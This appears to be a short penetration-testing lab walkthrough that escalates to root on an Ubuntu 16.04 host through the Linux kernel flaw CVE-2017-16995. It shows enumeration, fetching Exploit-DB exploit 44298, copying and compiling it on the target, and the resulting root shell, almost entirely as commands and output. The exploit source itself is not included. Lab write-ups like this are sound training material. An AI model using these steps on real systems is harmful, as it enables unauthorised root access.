# CVE-2017-16995 - Linux Kernel < 4.4.0-116 (Ubuntu 16.04.4) - Local Privilege Escalation

## Enumeration

```bash
$ uname -a

Linux NIX02 4.4.0-116-generic #140-Ubuntu SMP Mon Feb 12 21:23:04 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux
```

## Exploitation

```bash
$ searchsploit -p 44298
  Exploit: Linux Kernel < 4.4.0-116 (Ubuntu 16.04.4) - Local Privilege Escalation
      URL: https://www.exploit-db.com/exploits/44298
     Path: /usr/share/exploitdb/exploits/linux/local/44298.c
    Codes: CVE-2017-16995
 Verified: False
File Type: C source, ASCII text
```

```bash
$ scp /usr/share/exploitdb/exploits/linux/local/44298.c student@target_ip:~/

$ ssh student@target_ip
```

```bash
student@NIX02:~$ gcc 44298.c -o CVE-2017-16995-exploit
```

```bash
student@NIX02:~$ ls -lha CVE-2017-16995-exploit 
-rwxrwxr-x 1 student student 14K Nov  5 01:51 CVE-2017-16995-exploit
```

```bash
student@NIX02:~$ ./CVE-2017-16995-exploit 
task_struct = ffff8800b8701c00
uidptr = ffff8800bb6f0904
spawning root shell

root@NIX02:/tmp# id
uid=0(root) gid=0(root) groups=0(root),1008(student)
```

## Links

- [Exploit DB - CVE-2017-16995](https://www.exploit-db.com/exploits/44298)
- [Blog - CVE-2017-16995](https://0xma.github.io/hacking/local_privilege_escalation_on_linux_kernel.html)